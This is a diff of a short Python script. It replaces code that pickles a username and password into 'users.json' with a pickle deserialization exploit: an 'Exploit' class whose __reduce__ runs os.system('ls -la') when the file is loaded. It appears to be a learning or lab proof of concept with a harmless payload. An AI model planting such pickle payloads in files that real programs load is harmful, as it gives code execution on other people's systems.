@@ -1,15 +1,15 @@
-#client.py
-
 import os
 import pickle
-def fun(name,password):
-    s = {"username":name,"password":password}
-    safecode = pickle.dumps(s)
-    with open("users.json","wb") as f:
-        f.write(safecode)
-    return safecode
 
-if __name__ == '__main__':
-    u = input("Username : ")
-    p = input("Password : ")
-    yo_fun = fun(u,p) 
+class Exploit():
+    def __reduce__(self):
+        return(os.system,('ls -la',))
+def serialize_exploit():      
+    name = {"username":"name","password":"password"}      
+    f = open("users.json","wb")      
+    safecode = pickle.dump(Exploit(),f)      
+    return safecode
+if __name__ == '__main__':      
+   # u = "Sainya"
+   # p = "Ranakshetam"
+    safecode = serialize_exploit()
